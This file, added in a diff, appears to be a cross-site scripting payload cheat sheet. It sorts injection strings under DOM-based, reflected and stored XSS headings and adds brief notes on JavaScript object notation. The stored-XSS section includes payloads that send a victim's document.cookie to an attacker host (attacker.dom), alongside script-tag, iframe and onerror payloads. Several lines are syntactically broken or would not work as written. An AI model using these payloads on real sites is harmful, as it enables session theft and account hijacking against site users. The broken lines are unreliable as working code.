@@ -1,0 +1,40 @@
+Cross-Site-Scripting
+XSS
+
+<script>code</script>
+"<script>code</script>
+"'<script>code</script>
+'<script>code</script>
+;"<script>code</script>
+;'<script>code</script>
+
+
+How Things Work
+Given a defined DOM object
+	var object={Iam:4,Var:"iable"};
+properties or stored variables may be called arbitrarily to return at runtime in 2 notations
+	object.var;//	Dot Notation
+	object["Var"];//	Bracket Notation
+
+DOM-BASED XSS
+Exploitable DOM objects
+window.location.[host|hostname|href|origin|pathname|port|protocol]
+window.open(url,name);//
+nestedwindow.opener.document.write("write to parent into");//
+<script>http://url.dom/document.getElementByID('id')</script>
+setTimeout(function(){alert("call < function after > milliseconds",15000);//
+setInterval(alert("call < stored function every > milliseconds",15000);//
+
+REFLECTED XSS
+/<script>alert(document.domain)</script>
+/<iframe>document.cookie</iframe>
+http://url.dom/#the%20rest%20of%20this%20line%20is%20read%20as%20the%20input%20value%20for%20each%20window.location.hash
+/<script>console.log("debug me");</script>
+<script>eval('var x=1;alert(x)');
+
+STORED XSS
+<iframe>parent.document.cookie</iframe>
+img=new Image();img.src="http://attacker.dom?cookie="+document.cookie;
+<script>img=new Image();img.src="http://attacker.dom?cookie="+document.cookie<script>
+<img src=location.here onerror="alert(document.cookie)"/>
+<script>console.log("VALUE x:");console.log(x);console.log("VALUE y:");console.log(y);</script>]
